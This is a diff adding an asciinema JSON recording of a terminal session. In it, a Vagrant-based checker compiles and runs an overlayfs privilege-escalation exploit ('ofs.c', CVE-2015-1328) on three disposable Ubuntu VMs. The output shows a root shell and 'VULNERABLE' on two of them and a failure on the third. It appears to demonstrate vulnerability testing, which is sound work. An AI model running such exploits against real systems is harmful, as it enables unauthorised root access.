@@ -1,0 +1,1054 @@
+{
+  "version": 1,
+  "width": 181,
+  "height": 12,
+  "duration": 174.316014,
+  "command": "/bin/bash",
+  "title": "",
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.024605,
+      "\u001b[?1034h"
+    ],
+    [
+      0.000016,
+      "bash-3.2$ "
+    ],
+    [
+      1.714810,
+      "."
+    ],
+    [
+      0.000013,
+      "/va"
+    ],
+    [
+      0.000003,
+      "g"
+    ],
+    [
+      0.000012,
+      "ra"
+    ],
+    [
+      0.000012,
+      "n"
+    ],
+    [
+      0.000004,
+      "t"
+    ],
+    [
+      0.000010,
+      "_"
+    ],
+    [
+      0.001434,
+      "build.py -c \"uname -a \u0026\u0026 id \u0026\u0026 cd build/exploit/ \u0026\u0026 gcc ofs.c -o ofs \u0026\u0026 ./ofs\""
+    ],
+    [
+      0.898909,
+      "\r\n"
+    ],
+    [
+      0.130599,
+      "Distros: [{'url': 'https://atlas.hashicorp.com/sincerely/trusty64', 'name': 'sincerely/trusty64', 'provider': 'virtualbox'}, {'url': 'https://atlas.hashicorp.com/puphpet/ubuntu1204-x64', 'name': 'puphpet/ubuntu1204-x64', 'provider': 'virtualbox'}, {'url': 'https://atlas.hashicorp.com/ubuntu/trusty64', 'name': 'ubuntu/trusty64', 'provider': 'virtualbox'}]\r\n"
+    ],
+    [
+      0.000021,
+      "Download Vagrant: sincerely/trusty64\r\n"
+    ],
+    [
+      2.749119,
+      "\u001b[1m==\u003e box: Loading metadata for box 'https://atlas.hashicorp.com/sincerely/trusty64'\u001b[0m\r\n"
+    ],
+    [
+      0.959592,
+      "\u001b[1m==\u003e box: Adding box 'sincerely/trusty64' (v1.0) for provider: virtualbox\u001b[0m\r\n"
+    ],
+    [
+      0.023561,
+      "\u001b[0;31mThe box you're attempting to add already exists. Remove it before\r\nadding it again or add it with the `--force` flag.\r\n\r\nName: sincerely/trusty64\r\nProvider: virtualbox\r\nVersion: 1.0\u001b[0m\r\n"
+    ],
+    [
+      0.028082,
+      "Start Vagrant: sincerely/trusty64\r\n"
+    ],
+    [
+      1.461778,
+      "\u001b[0mBringing machine 'default' up with 'virtualbox' provider...\u001b[0m\r\n"
+    ],
+    [
+      0.169785,
+      "\u001b[1m==\u003e default: Importing base box 'sincerely/trusty64'...\u001b[0m\r\n"
+    ],
+    [
+      10.556254,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000245,
+      "\u001b[0mProgress: 40%\u001b[0m"
+    ],
+    [
+      0.602719,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000164,
+      "\u001b[0mProgress: 50%\u001b[0m"
+    ],
+    [
+      1.208627,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000196,
+      "\u001b[0mProgress: 60%\u001b[0m"
+    ],
+    [
+      3.727477,
+      "\u001b[0m\r\u001b[K\u001b[0m\u001b[0mProgress: 70%\u001b[0m"
+    ],
+    [
+      2.332531,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000214,
+      "\u001b[0mProgress: 80%\u001b[0m"
+    ],
+    [
+      1.308216,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000223,
+      "\u001b[0mProgress: 90%\u001b[0m"
+    ],
+    [
+      2.152907,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000674,
+      "\u001b[1m==\u003e default: Matching MAC address for NAT networking...\u001b[0m\r\n"
+    ],
+    [
+      0.678126,
+      "\u001b[1m==\u003e default: Setting the name of the VM: distro_checker_default_1441644317573_83809\u001b[0m\r\n"
+    ],
+    [
+      0.545189,
+      "\u001b[1m==\u003e default: Clearing any previously set network interfaces...\u001b[0m\r\n"
+    ],
+    [
+      0.046562,
+      "\u001b[1m==\u003e default: Preparing network interfaces based on configuration...\u001b[0m\r\n"
+    ],
+    [
+      0.000694,
+      "\u001b[0m    default: Adapter 1: nat\u001b[0m\r\n"
+    ],
+    [
+      0.055530,
+      "\u001b[1m==\u003e default: Forwarding ports...\u001b[0m\r\n"
+    ],
+    [
+      0.081075,
+      "\u001b[0m    default: 22 =\u003e 2222 (adapter 1)\u001b[0m\r\n"
+    ],
+    [
+      0.161476,
+      "\u001b[1m==\u003e default: Running 'pre-boot' VM customizations...\u001b[0m\r\n"
+    ],
+    [
+      0.107500,
+      "\u001b[1m==\u003e default: Booting VM...\u001b[0m\r\n"
+    ],
+    [
+      0.299218,
+      "\u001b[1m==\u003e default: Waiting for machine to boot. This may take a few minutes...\u001b[0m\r\n"
+    ],
+    [
+      0.352711,
+      "\u001b[0m    default: SSH address: 127.0.0.1:2222\u001b[0m\r\n"
+    ],
+    [
+      0.000233,
+      "\u001b[0m    default: SSH username: vagrant\u001b[0m\r\n"
+    ],
+    [
+      0.000203,
+      "\u001b[0m    default: SSH auth method: private key\u001b[0m"
+    ],
+    [
+      0.000004,
+      "\r\n"
+    ],
+    [
+      7.848173,
+      "\u001b[0m    default: \r\n    default: Vagrant insecure key detected. Vagrant will automatically replace\r\n    default: this with a newly generated keypair for better security.\u001b[0m\r\n"
+    ],
+    [
+      0.391734,
+      "\u001b[0m    default: \r\n    default: Inserting generated public key within guest...\u001b[0m\r\n"
+    ],
+    [
+      0.119108,
+      "\u001b[0m    default: Removing insecure key from the guest if it's present...\u001b[0m\r\n"
+    ],
+    [
+      0.119296,
+      "\u001b[0m    default: Key inserted! Disconnecting and reconnecting using new SSH key...\u001b[0m\r\n"
+    ],
+    [
+      1.201167,
+      "\u001b[1m==\u003e default: Machine booted and ready!\u001b[0m\r\n"
+    ],
+    [
+      0.000445,
+      "\u001b[1m==\u003e default: Checking for guest additions in VM...\u001b[0m\r\n"
+    ],
+    [
+      0.039842,
+      "\u001b[0m    default: The guest additions on this VM do not match the installed version of\r\n    default: VirtualBox! In most cases this is fine, but in rare cases it can\r\n    default: prevent things such as shared folders from working properly. If you see\r\n    default: shared folder errors, please make sure the guest additions within the\r\n    default: virtual machine match the version of VirtualBox you have installed on\r\n    default: your host and reload your VM.\r\n    default: \r\n    default: Guest Additions Version: 4."
+    ],
+    [
+      0.000008,
+      "3.8\r\n    default: VirtualBox Version: 5.0\u001b[0m\r\n"
+    ],
+    [
+      0.082524,
+      "\u001b[1m==\u003e default: Running provisioner: file...\u001b[0m\r\n"
+    ],
+    [
+      6.467829,
+      "\u001b[1m==\u003e default: Running provisioner: shell...\u001b[0m\r\n"
+    ],
+    [
+      0.257086,
+      "\u001b[0m    default: Running: inline script\u001b[0m\r\n"
+    ],
+    [
+      0.038972,
+      "\u001b[1;31m==\u003e default: stdin: is not a tty\u001b[0m\r\n"
+    ],
+    [
+      0.009829,
+      "\u001b[1;32m==\u003e default: uid=0(root) gid=0(root) groups=0(root)\u001b[0m\r\n"
+    ],
+    [
+      2.395498,
+      "Linux trusty64 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux\r\n"
+    ],
+    [
+      0.003433,
+      "uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)\r\n"
+    ],
+    [
+      0.226375,
+      "spawning threads\r\n"
+    ],
+    [
+      0.003602,
+      "mount #1"
+    ],
+    [
+      0.000500,
+      "\r\n"
+    ],
+    [
+      0.013663,
+      "mount #2\r\n"
+    ],
+    [
+      0.283354,
+      "child threads done\r\n/etc/ld.so.preload created\r\ncreating shared library\r\n"
+    ],
+    [
+      0.066921,
+      "# "
+    ],
+    [
+      0.781384,
+      "."
+    ],
+    [
+      0.287822,
+      "/"
+    ],
+    [
+      0.288264,
+      "r"
+    ],
+    [
+      0.077960,
+      "o"
+    ],
+    [
+      0.534866,
+      "o"
+    ],
+    [
+      0.197163,
+      "t"
+    ],
+    [
+      0.176783,
+      "."
+    ],
+    [
+      0.070024,
+      "s"
+    ],
+    [
+      0.738332,
+      "h"
+    ],
+    [
+      0.001373,
+      "\r\n"
+    ],
+    [
+      0.008500,
+      "CVE-2015-1328: \u001b[91mVULNERABLE\u001b[39m\r\n"
+    ],
+    [
+      0.000272,
+      "# "
+    ],
+    [
+      0.912763,
+      "e"
+    ],
+    [
+      0.250439,
+      "i"
+    ],
+    [
+      0.315763,
+      "t"
+    ],
+    [
+      0.294398,
+      "\u0008 \u0008"
+    ],
+    [
+      0.107783,
+      "\u0008 \u0008"
+    ],
+    [
+      0.075898,
+      "x"
+    ],
+    [
+      0.131342,
+      "i"
+    ],
+    [
+      0.070758,
+      "t"
+    ],
+    [
+      0.131509,
+      "\r\n"
+    ],
+    [
+      0.000364,
+      "Connection to 127.0.0.1 closed.\r\r\n"
+    ],
+    [
+      2.477394,
+      "\u001b[1m==\u003e default: Forcing shutdown of VM...\u001b[0m\r\n"
+    ],
+    [
+      1.141522,
+      "\u001b[1m==\u003e default: Destroying VM and associated drives...\u001b[0m\r\n"
+    ],
+    [
+      0.257084,
+      "\u001b[1m==\u003e default: Running cleanup tasks for 'file' provisioner...\u001b[0m\r\n"
+    ],
+    [
+      0.000239,
+      "\u001b[1m==\u003e default: Running cleanup tasks for 'shell' provisioner...\u001b[0m\r\n"
+    ],
+    [
+      0.037425,
+      "Download Vagrant: puphpet/ubuntu1204-x64\r\n"
+    ],
+    [
+      2.170281,
+      "\u001b[1m==\u003e box: Loading metadata for box 'https://atlas.hashicorp.com/puphpet/ubuntu1204-x64'\u001b[0m\r\n"
+    ],
+    [
+      0.935058,
+      "\u001b[1m==\u003e box: Adding box 'puphpet/ubuntu1204-x64' (v2.0) for provider: virtualbox\u001b[0m\r\n"
+    ],
+    [
+      0.052403,
+      "\u001b[0;31mThe box you're attempting to add already exists. Remove it before\r\nadding it again or add it with the `--force` flag.\r\n\r\nName: puphpet/ubuntu1204-x64\r\nProvider: virtualbox\r\nVersion: 2.0\u001b[0m"
+    ],
+    [
+      0.000018,
+      "\r\n"
+    ],
+    [
+      0.025839,
+      "Start Vagrant: puphpet/ubuntu1204-x64\r\n"
+    ],
+    [
+      1.467908,
+      "\u001b[0mBringing machine 'default' up with 'virtualbox' provider...\u001b[0m\r\n"
+    ],
+    [
+      0.166459,
+      "\u001b[1m==\u003e default: Importing base box 'puphpet/ubuntu1204-x64'...\u001b[0m\r\n"
+    ],
+    [
+      4.920054,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000145,
+      "\u001b[0mProgress: 20%\u001b[0m"
+    ],
+    [
+      0.708037,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000243,
+      "\u001b[0mProgress: 30%\u001b[0m"
+    ],
+    [
+      0.606518,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000276,
+      "\u001b[0mProgress: 40%\u001b[0m"
+    ],
+    [
+      1.006914,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000148,
+      "\u001b[0mProgress: 50%\u001b[0m"
+    ],
+    [
+      0.302496,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000257,
+      "\u001b[0mProgress: 60%\u001b[0m"
+    ],
+    [
+      0.704076,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000157,
+      "\u001b[0mProgress: 70%\u001b[0m"
+    ],
+    [
+      0.605597,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000225,
+      "\u001b[0mProgress: 80%\u001b[0m"
+    ],
+    [
+      0.201774,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000150,
+      "\u001b[0mProgress: 90%\u001b[0m"
+    ],
+    [
+      0.279061,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000491,
+      "\u001b[1m==\u003e default: Matching MAC address for NAT networking...\u001b[0m\r\n"
+    ],
+    [
+      0.769494,
+      "\u001b[1m==\u003e default: Setting the name of the VM: distro_checker_default_1441644363081_73902\u001b[0m\r\n"
+    ],
+    [
+      0.488691,
+      "\u001b[1m==\u003e default: Clearing any previously set network interfaces...\u001b[0m\r\n"
+    ],
+    [
+      0.051823,
+      "\u001b[1m==\u003e default: Preparing network interfaces based on configuration...\u001b[0m\r\n"
+    ],
+    [
+      0.000564,
+      "\u001b[0m    default: Adapter 1: nat\u001b[0m\r\n"
+    ],
+    [
+      0.067702,
+      "\u001b[1m==\u003e default: Forwarding ports...\u001b[0m\r\n"
+    ],
+    [
+      0.080857,
+      "\u001b[0m    default: 22 =\u003e 2222 (adapter 1)\u001b[0m\r\n"
+    ],
+    [
+      0.187496,
+      "\u001b[1m==\u003e default: Running 'pre-boot' VM customizations...\u001b[0m\r\n"
+    ],
+    [
+      0.115074,
+      "\u001b[1m==\u003e default: Booting VM...\u001b[0m\r\n"
+    ],
+    [
+      0.290312,
+      "\u001b[1m==\u003e default: Waiting for machine to boot. This may take a few minutes...\u001b[0m\r\n"
+    ],
+    [
+      0.439522,
+      "\u001b[0m    default: SSH address: 127.0.0.1:2222\u001b[0m\r\n"
+    ],
+    [
+      0.000253,
+      "\u001b[0m    default: SSH username: vagrant\u001b[0m\r\n"
+    ],
+    [
+      0.000277,
+      "\u001b[0m    default: SSH auth method: private key\u001b[0m\r\n"
+    ],
+    [
+      15.183404,
+      "\u001b[0m    default: Warning: Connection timeout. Retrying...\u001b[0m\r\n"
+    ],
+    [
+      0.612357,
+      "\u001b[0m    default: \r\n    default: Vagrant insecure key detected. Vagrant will automatically replace\r\n    default: this with a newly generated keypair for better security.\u001b[0m\r\n"
+    ],
+    [
+      1.864328,
+      "\u001b[0m    default: \r\n    default: Inserting generated public key within guest...\u001b[0m\r\n"
+    ],
+    [
+      1.049789,
+      "\u001b[0m    default: Removing insecure key from the guest if it's present...\u001b[0m\r\n"
+    ],
+    [
+      0.616512,
+      "\u001b[0m    default: Key inserted! Disconnecting and reconnecting using new SSH key...\u001b[0m\r\n"
+    ],
+    [
+      1.310842,
+      "\u001b[1m==\u003e default: Machine booted and ready!\u001b[0m\r\n"
+    ],
+    [
+      0.000476,
+      "\u001b[1m==\u003e default: Checking for guest additions in VM...\u001b[0m\r\n"
+    ],
+    [
+      0.041785,
+      "\u001b[0m    default: The guest additions on this VM do not match the installed version of\r\n    default: VirtualBox! In most cases this is fine, but in rare cases it can\r\n    default: prevent things such as shared folders from working properly. If you see\r\n    default: shared folder errors, please make sure the guest additions within the\r\n    default: virtual machine match the version of VirtualBox you have installed on\r\n    default: your host and reload your VM.\r\n    default: \r\n    default: Guest Additions Version: 4."
+    ],
+    [
+      0.000007,
+      "3.20\r\n    default: VirtualBox Version: 5.0\u001b[0m"
+    ],
+    [
+      0.000025,
+      "\r\n"
+    ],
+    [
+      0.085714,
+      "\u001b[1m==\u003e default: Running provisioner: file...\u001b[0m\r\n"
+    ],
+    [
+      10.414311,
+      "\u001b[1m==\u003e default: Running provisioner: shell...\u001b[0m\r\n"
+    ],
+    [
+      0.464866,
+      "\u001b[0m    default: Running: inline script\u001b[0m\r\n"
+    ],
+    [
+      0.286507,
+      "\u001b[1;31m==\u003e default: stdin: is not a tty\u001b[0m\r\n"
+    ],
+    [
+      0.021541,
+      "\u001b[1;32m==\u003e default: uid=0(root) gid=0(root) groups=0(root)\u001b[0m\r\n"
+    ],
+    [
+      2.388851,
+      "Linux packer-virtualbox-iso-1422596416 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:51:20 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux\r\n"
+    ],
+    [
+      0.003724,
+      "uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)"
+    ],
+    [
+      0.000006,
+      "\r\n"
+    ],
+    [
+      0.251019,
+      "spawning threads\r\n"
+    ],
+    [
+      0.004103,
+      "mount #1\r\n"
+    ],
+    [
+      0.015264,
+      "mount #2\r\n"
+    ],
+    [
+      0.289034,
+      "child threads done\r\n/etc/ld.so.preload created\r\ncreating shared library\r\n"
+    ],
+    [
+      0.061227,
+      "# "
+    ],
+    [
+      0.687749,
+      "."
+    ],
+    [
+      0.212882,
+      "/"
+    ],
+    [
+      0.398495,
+      "r"
+    ],
+    [
+      0.155117,
+      "o"
+    ],
+    [
+      0.165733,
+      "o"
+    ],
+    [
+      0.345815,
+      "t"
+    ],
+    [
+      0.169770,
+      "."
+    ],
+    [
+      0.098416,
+      "s"
+    ],
+    [
+      0.157400,
+      "h"
+    ],
+    [
+      0.207845,
+      "\r\n"
+    ],
+    [
+      0.009370,
+      "CVE-2015-1328: "
+    ],
+    [
+      0.000498,
+      "\u001b[91mVULNERABLE\u001b[39m"
+    ],
+    [
+      0.000236,
+      "\r\n"
+    ],
+    [
+      0.000660,
+      "# "
+    ],
+    [
+      1.106919,
+      "e"
+    ],
+    [
+      0.416714,
+      "x"
+    ],
+    [
+      0.178637,
+      "i"
+    ],
+    [
+      0.103692,
+      "t"
+    ],
+    [
+      0.232038,
+      "\r\n"
+    ],
+    [
+      0.002210,
+      "Connection to 127.0.0.1 closed.\r\r\n"
+    ],
+    [
+      2.442186,
+      "\u001b[1m==\u003e default: Forcing shutdown of VM...\u001b[0m\r\n"
+    ],
+    [
+      1.170400,
+      "\u001b[1m==\u003e default: Destroying VM and associated drives...\u001b[0m\r\n"
+    ],
+    [
+      0.234937,
+      "\u001b[1m==\u003e default: Running cleanup tasks for 'file' provisioner...\u001b[0m\r\n"
+    ],
+    [
+      0.000222,
+      "\u001b[1m==\u003e default: Running cleanup tasks for 'shell' provisioner...\u001b[0m\r\n"
+    ],
+    [
+      0.041357,
+      "Download Vagrant: ubuntu/trusty64\r\n"
+    ],
+    [
+      2.460183,
+      "\u001b[1m==\u003e box: Loading metadata for box 'https://atlas.hashicorp.com/ubuntu/trusty64'\u001b[0m\r\n"
+    ],
+    [
+      1.029906,
+      "\u001b[1m==\u003e box: Adding box 'ubuntu/trusty64' (v20150902.0.3) for provider: virtualbox\u001b[0m\r\n"
+    ],
+    [
+      0.055140,
+      "\u001b[0;31mThe box you're attempting to add already exists. Remove it before\r\nadding it again or add it with the `--force` flag.\r\n\r\nName: ubuntu/trusty64\r\nProvider: virtualbox\r\nVersion: 20150902.0.3\u001b[0m\r\n"
+    ],
+    [
+      0.031386,
+      "Start Vagrant: ubuntu/trusty64\r\n"
+    ],
+    [
+      1.424058,
+      "\u001b[0mBringing machine 'default' up with 'virtualbox' provider...\u001b[0m\r\n"
+    ],
+    [
+      0.173669,
+      "\u001b[1m==\u003e default: Importing base box 'ubuntu/trusty64'...\u001b[0m"
+    ],
+    [
+      0.000008,
+      "\r\n"
+    ],
+    [
+      6.940489,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000214,
+      "\u001b[0mProgress: 90%\u001b[0m"
+    ],
+    [
+      0.355311,
+      "\u001b[0m\r\u001b[K\u001b[0m"
+    ],
+    [
+      0.000916,
+      "\u001b[1m==\u003e default: Matching MAC address for NAT networking...\u001b[0m\r\n"
+    ],
+    [
+      0.667964,
+      "\u001b[1m==\u003e default: Setting the name of the VM: distro_checker_default_1441644421446_12736\u001b[0m\r\n"
+    ],
+    [
+      0.129877,
+      "\u001b[1m==\u003e default: Clearing any previously set forwarded ports...\u001b[0m\r\n"
+    ],
+    [
+      0.528627,
+      "\u001b[1m==\u003e default: Clearing any previously set network interfaces...\u001b[0m\r\n"
+    ],
+    [
+      0.047532,
+      "\u001b[1m==\u003e default: Preparing network interfaces based on configuration...\u001b[0m\r\n"
+    ],
+    [
+      0.000523,
+      "\u001b[0m    default: Adapter 1: nat\u001b[0m\r\n"
+    ],
+    [
+      0.070453,
+      "\u001b[1m==\u003e default: Forwarding ports...\u001b[0m\r\n"
+    ],
+    [
+      0.079980,
+      "\u001b[0m    default: 22 =\u003e 2222 (adapter 1)\u001b[0m\r\n"
+    ],
+    [
+      0.182735,
+      "\u001b[1m==\u003e default: Running 'pre-boot' VM customizations...\u001b[0m\r\n"
+    ],
+    [
+      0.130752,
+      "\u001b[1m==\u003e default: Booting VM...\u001b[0m\r\n"
+    ],
+    [
+      0.255755,
+      "\u001b[1m==\u003e default: Waiting for machine to boot. This may take a few minutes...\u001b[0m\r\n"
+    ],
+    [
+      0.443526,
+      "\u001b[0m    default: SSH address: 127.0.0.1:2222\u001b[0m\r\n"
+    ],
+    [
+      0.000447,
+      "\u001b[0m    default: SSH username: vagrant\u001b[0m\r\n"
+    ],
+    [
+      0.000245,
+      "\u001b[0m    default: SSH auth method: private key\u001b[0m\r\n"
+    ],
+    [
+      15.157218,
+      "\u001b[0m    default: Warning: Connection timeout. Retrying...\u001b[0m\r\n"
+    ],
+    [
+      2.948084,
+      "\u001b[0m    default: \r\n    default: Vagrant insecure key detected. Vagrant will automatically replace\r\n    default: this with a newly generated keypair for better security.\u001b[0m\r\n"
+    ],
+    [
+      0.320084,
+      "\u001b[0m    default: \r\n    default: Inserting generated public key within guest...\u001b[0m\r\n"
+    ],
+    [
+      0.073038,
+      "\u001b[0m    default: Removing insecure key from the guest if it's present...\u001b[0m\r\n"
+    ],
+    [
+      0.054158,
+      "\u001b[0m    default: Key inserted! Disconnecting and reconnecting using new SSH key...\u001b[0m"
+    ],
+    [
+      0.000010,
+      "\r\n"
+    ],
+    [
+      1.078425,
+      "\u001b[1m==\u003e default: Machine booted and ready!\u001b[0m"
+    ],
+    [
+      0.000008,
+      "\r\n"
+    ],
+    [
+      0.000488,
+      "\u001b[1m==\u003e default: Checking for guest additions in VM...\u001b[0m"
+    ],
+    [
+      0.000006,
+      "\r\n"
+    ],
+    [
+      0.044420,
+      "\u001b[0m    default: The guest additions on this VM do not match the installed version of\r\n    default: VirtualBox! In most cases this is fine, but in rare cases it can\r\n    default: prevent things such as shared folders from working properly. If you see\r\n    default: shared folder errors, please make sure the guest additions within the\r\n    default: virtual machine match the version of VirtualBox you have installed on\r\n    default: your host and reload your VM.\r\n    default: \r\n    default: Guest Additions Version: 4."
+    ],
+    [
+      0.000195,
+      "3.10\r\n    default: VirtualBox Version: 5.0\u001b[0m\r\n"
+    ],
+    [
+      0.111126,
+      "\u001b[1m==\u003e default: Running provisioner: file...\u001b[0m"
+    ],
+    [
+      0.000009,
+      "\r\n"
+    ],
+    [
+      5.984424,
+      "\u001b[1m==\u003e default: Running provisioner: shell...\u001b[0m\r\n"
+    ],
+    [
+      0.255659,
+      "\u001b[0m    default: Running: inline script\u001b[0m\r\n"
+    ],
+    [
+      0.027286,
+      "\u001b[1;31m==\u003e default: stdin: is not a tty\u001b[0m"
+    ],
+    [
+      0.000008,
+      "\r\n"
+    ],
+    [
+      0.006987,
+      "\u001b[1;32m==\u003e default: uid=0(root) gid=0(root) groups=0(root)\u001b[0m\r\n"
+    ],
+    [
+      2.530785,
+      "_____________________________________________________________________"
+    ],
+    [
+      0.000357,
+      "\r\n"
+    ],
+    [
+      0.000308,
+      "WARNING! Your environment specifies an invalid locale."
+    ],
+    [
+      0.000219,
+      "\r\n"
+    ],
+    [
+      0.000288,
+      " This can affect your user experience significantly, including the"
+    ],
+    [
+      0.000138,
+      "\r\n"
+    ],
+    [
+      0.000345,
+      " ability to manage packages. You may install the locales by running:"
+    ],
+    [
+      0.001099,
+      "\r\n\r\n"
+    ],
+    [
+      0.000407,
+      "   sudo apt-get install language-pack-UTF-8"
+    ],
+    [
+      0.000303,
+      "\r\n"
+    ],
+    [
+      0.000484,
+      "     or"
+    ],
+    [
+      0.000283,
+      "\r\n"
+    ],
+    [
+      0.000359,
+      "   sudo locale-gen UTF-8"
+    ],
+    [
+      0.000294,
+      "\r\n\r\nTo see all available language packs, run:"
+    ],
+    [
+      0.000196,
+      "\r\n"
+    ],
+    [
+      0.001318,
+      "   apt-cache search \"^language-pack-[a-z][a-z]$\"\r\nTo disable this message for all users, run:\r\n   sudo touch /var/lib/cloud/instance/locale-check.skip\r\n_____________________________________________________________________\r\n\r\nLinux vagrant-ubuntu-trusty-64 3.13.0-63-generic #103-Ubuntu SMP Fri Aug 14 21:42:59 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux"
+    ],
+    [
+      0.000227,
+      "\r\n"
+    ],
+    [
+      0.001403,
+      "uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)"
+    ],
+    [
+      0.000392,
+      "\r\n"
+    ],
+    [
+      0.154847,
+      "spawning threads\r\n"
+    ],
+    [
+      0.001566,
+      "mount #1"
+    ],
+    [
+      0.000006,
+      "\r\n"
+    ],
+    [
+      0.004094,
+      "mount #2\r\n"
+    ],
+    [
+      0.296372,
+      "child threads done\r\nexploit failed\r\n"
+    ],
+    [
+      0.000872,
+      "Connection to 127.0.0.1 closed.\r\r\n"
+    ],
+    [
+      2.483194,
+      "\u001b[1m==\u003e default: Forcing shutdown of VM...\u001b[0m\r\n"
+    ],
+    [
+      1.139700,
+      "\u001b[1m==\u003e default: Destroying VM and associated drives...\u001b[0m\r\n"
+    ],
+    [
+      0.200188,
+      "\u001b[1m==\u003e default: Running cleanup tasks for 'file' provisioner...\u001b[0m\r\n"
+    ],
+    [
+      0.000259,
+      "\u001b[1m==\u003e default: Running cleanup tasks for 'shell' provisioner...\u001b[0m\r\n"
+    ],
+    [
+      0.047444,
+      "bash-3.2$ "
+    ],
+    [
+      1.129736,
+      "\r\u001b[Kbash-3.2$ "
+    ],
+    [
+      0.021656,
+      "\r\u001b[Kbash-3.2$ "
+    ],
+    [
+      1.324437,
+      "\r\u001b[Kbash-3.2$ "
+    ],
+    [
+      2.030178,
+      "e"
+    ],
+    [
+      0.149199,
+      "x"
+    ],
+    [
+      0.078303,
+      "i"
+    ],
+    [
+      0.066281,
+      "t"
+    ],
+    [
+      0.104902,
+      "\r\n"
+    ],
+    [
+      0.000103,
+      "exit\r\n"
+    ]
+  ]
+}
